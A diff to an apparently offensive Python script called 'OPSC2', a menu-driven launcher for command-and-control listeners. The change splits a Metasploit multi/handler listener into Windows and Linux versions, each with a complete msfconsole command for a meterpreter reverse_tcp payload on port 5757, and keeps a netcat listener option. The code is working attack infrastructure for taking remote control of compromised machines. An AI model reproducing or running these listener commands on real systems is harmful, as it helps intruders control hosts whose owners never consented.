@@ -4,7 +4,7 @@ import time
 
 # Tick Prompts [!] [*] [+]
 
-info = "[*]"
+info = "[>]"
 success = "[+]"
 failure = "[!]"
 
@@ -46,9 +46,20 @@ banner = r"""
                                         v1.2
 """
 
-def meterpreter_listener():
+def meterpreter_listener_windows():
     # Define the command to run
-    command = 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0>
+    command = 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 5757; exploit -j"'
+
+    # Use the subprocess module to run the command
+    try:
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error: {e}")
+
+
+def meterpreter_listener_linux():
+    # Define the command to run
+    command = 'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 5757; exploit -j"'
 
     # Use the subprocess module to run the command
     try:
@@ -67,22 +78,28 @@ def nc_listener():
         print(f"Error: {e}")
 
 print(banner)
-hacker_print(f"{GREEN}{info} Select the listener you want to initiate:")
+print(f"\n{BOLD}{info} Select the listener you want to initiate:")
 hacker_print(f'{GREEN}[1] Meterpreter')
 hacker_print(f'{GREEN}[2] ThreatCat (Netcat)')
 
 choice = input(f"\n{UNDERLINE}{GREEN}OPSC2{RESET} ▶ ")
 
 if choice == "1":
-    print(f"\n{GREEN}Initiating Meterpreter listener...")
-    meterpreter_listener()
+    print(f"\n{BOLD}{info}Select Operating System:")
+    hacker_print(f'{GREEN}[1] Windows')
+    hacker_print(f'{GREEN}[2] Linux')
+    choice_two = input(f"\n{UNDERLINE}{GREEN}OPSC2{RESET} ▶ ")
+    if choice_two == "1":
+        print(f"\n{GREEN}Initiating Meterpreter listener for Windows...")
+        meterpreter_listener_windows()
+    elif choice_two == "2":
+        print(f"\n{GREEN}Initiating Meterpreter listener for Linux...")
+        meterpreter_listener_linux()
+
 elif choice == "2":
     print(f"\n{GREEN}Initiating ThreatCat listener...")
     nc_listener()
 else:
     hacker_print(f"{GREEN}Invalid choice. Exiting...")
-
-
-
 
 
